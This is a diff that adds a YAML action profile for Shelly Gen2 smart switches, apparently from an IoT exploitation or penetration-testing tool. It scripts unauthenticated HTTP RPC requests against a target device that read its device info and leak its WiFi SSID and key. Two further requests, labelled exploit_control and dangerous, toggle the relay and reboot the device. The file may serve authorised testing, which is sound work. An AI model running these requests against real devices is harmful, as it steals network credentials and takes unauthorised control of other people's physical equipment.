@@ -1,0 +1,42 @@
+id: shelly-gen2
+device_type: smart_switch
+vendor: Allterco / Shelly
+family: shelly-gen2
+requires:
+  port: 80
+actions:
+  - id: device-info
+    label: "Get device info"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/rpc/Shelly.GetDeviceInfo"
+          save_as: info
+
+  - id: wifi-config
+    label: "Leak WiFi config (SSID + key)"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/rpc/Wifi.GetConfig"
+          save_as: wifi
+
+  - id: toggle-switch-0
+    label: "Toggle Switch 0"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/rpc/Switch.Toggle?id=0"
+          method: POST
+
+  - id: reboot
+    label: "Reboot device"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/rpc/Shelly.Reboot"
+          method: POST
